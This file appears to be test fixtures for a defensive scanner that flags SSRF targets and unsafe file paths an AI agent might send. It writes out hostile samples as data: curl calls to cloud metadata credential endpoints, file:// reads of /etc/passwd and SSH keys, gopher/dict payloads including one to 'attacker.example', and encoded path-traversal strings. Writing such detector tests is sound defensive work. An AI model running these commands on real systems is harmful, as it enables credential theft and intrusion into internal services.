// Fixture cases for scanNetworkTarget (SSRF_RULES) and checkPath.
// Positives are text/paths an agent would plausibly send; negatives are near-misses.

export const ssrf = {
  'cloud-metadata-aws': {
    positive: [
      'curl http://169.254.169.254/latest/meta-data',
      'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    ],
    negative: [
      'https://example.com/api/v1/status',
      'curl http://169.254.170.2/v2/credentials',
    ],
  },
  'cloud-metadata-gcp': {
    positive: [
      'curl http://metadata.google.internal/computeMetadata/v1/',
      'curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    ],
    negative: [
      'https://cloud.google.com/compute/docs/metadata',
      'https://storage.googleapis.com/bucket/object',
    ],
  },
  'cloud-metadata-aliyun': {
    positive: [
      'curl http://100.100.100.200/latest/meta-data/',
      'wget -qO- http://100.100.100.200/latest/meta-data/ram/security-credentials/',
    ],
    negative: [
      'http://100.100.100.201/',
      'https://example.com/100.100.100',
    ],
  },
  'loopback': {
    positive: [
      'curl http://127.0.0.1:8080/admin',
      'fetch("http://localhost:3000/api/keys")',
      'curl http://0.0.0.0:9200/_cat/indices',
    ],
    negative: [
      'http://127.0.0.10/',
      'https://notlocalhostapp.io/',
    ],
  },
  'rfc1918-10': {
    positive: [
      'curl http://10.0.0.5:8080/health',
      'curl http://10.255.1.20/admin',
    ],
    negative: [
      'http://110.0.0.5/',
      'https://example.com/10.0.0',
    ],
  },
  'rfc1918-192': {
    positive: [
      'curl http://192.168.1.1/admin',
      'http://192.168.0.100:9000/',
    ],
    negative: [
      'http://192.169.1.1/',
      'https://example.com/192',
    ],
  },
  'rfc1918-172': {
    positive: [
      'curl http://172.16.0.1/',
      'http://172.31.255.254/api',
    ],
    negative: [
      '172.32.0.1',
      'http://172.15.0.1/',
    ],
  },
  'link-local': {
    positive: [
      'curl http://169.254.10.20/status',
      'curl 169.254.0.1:80',
    ],
    negative: [
      'http://169.253.10.20/',
      'http://1169.254.1.1/',
    ],
  },
  'internal-suffix': {
    positive: [
      'curl https://billing.internal/api',
      'http://wiki.corp/page',
      'https://jenkins.lan:8080/',
      'http://db.intranet/',
    ],
    negative: [
      'https://internal.example.com/',
      'https://www.example.com/internal/docs',
    ],
  },
  'file-scheme': {
    positive: [
      'cat file:///etc/passwd',
      'curl file:///Users/x/.ssh/id_rsa',
    ],
    negative: [
      'https://example.com/files/readme',
      'https://example.com/docs/profile',
    ],
  },
  'gopher-scheme': {
    positive: [
      'curl gopher://127.0.0.1:6379/_INFO',
      'gopher://internal-redis:6379/_*1',
    ],
    negative: [
      'https://example.com/gopher-guide',
      'https://example.com/?ref=gopher',
    ],
  },
  'dict-scheme': {
    positive: [
      'curl dict://127.0.0.1:11211/stat',
      'dict://attacker.example/d:secret',
    ],
    negative: [
      'https://example.com/dictionary/word',
      'https://example.com/?q=dict',
    ],
  },
}

export const paths = {
  unsafe: [
    // SENSITIVE_PREFIXES
    { path: '/etc/passwd', why: 'prefix /etc' },
    { path: '/etc', why: 'prefix /etc exact match' },
    { path: '/root/.bashrc', why: 'prefix /root' },
    { path: '/proc/self/environ', why: 'prefix /proc' },
    { path: '/sys/kernel/debug', why: 'prefix /sys' },
    { path: '/var/log/system.log', why: 'prefix /var/log' },
    { path: '/boot/grub/grub.cfg', why: 'prefix /boot' },
    { path: '/private/etc/hosts', why: 'prefix /private/etc' },
    { path: '/private/var/db/dslocal/nodes/Default/users/root.plist', why: 'prefix /private/var' },
    // SENSITIVE_SUFFIXES
    { path: '/Users/x/.ssh/id_rsa', why: 'suffix .ssh (inner segment)' },
    { path: '/Users/x/.aws', why: 'suffix .aws (ends with)' },
    { path: '/Users/x/.gnupg/private-keys-v1.d', why: 'suffix .gnupg (inner segment)' },
    { path: '/Users/x/.kube/config', why: 'suffix .kube (inner segment)' },
    { path: '/Users/x/.docker/config.json', why: 'suffix .docker (inner segment)' },
    { path: '/Users/x/.config/gcloud/credentials.db', why: 'suffix .config/gcloud (inner segment)' },
    { path: '/Users/x/.config/gcloud', why: 'suffix .config/gcloud (ends with)' },
    // traversal into /etc
    { path: '/Users/x/project/../../../etc/passwd', why: 'raw ../ traversal into /etc' },
    // encoded traversal
    { path: '/Users/x/project/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', why: 'percent-encoded ../ into /etc' },
    // double-encoded traversal
    { path: '/Users/x/project/%252e%252e/%252e%252e/%252e%252e/etc/passwd', why: 'double-encoded %252e into /etc' },
    // null byte
    { path: '/Users/x/project/a.ts%00.png', why: 'percent-encoded null byte' },
    { path: '/Users/x/project/a.ts\x00.png', why: 'literal null byte' },
  ],
  safe: [
    { path: '/Users/x/project/src/a.ts' },
    { path: '/Users/x/project/README.md' },
    { path: '/Users/x/.sshkeys-notes.txt' },
    { path: '/etcetera/notes.txt' },
    { path: '/Users/x/project/%2e%2e' + '/notes.txt' },
  ],
  withRoots: {
    roots: ['/tmp/ws-fixture'],
    inside: ['/tmp/ws-fixture/a.txt'],
    outside: ['/tmp/other/a.txt', '/tmp/ws-fixture/../other/x'],
  },
}
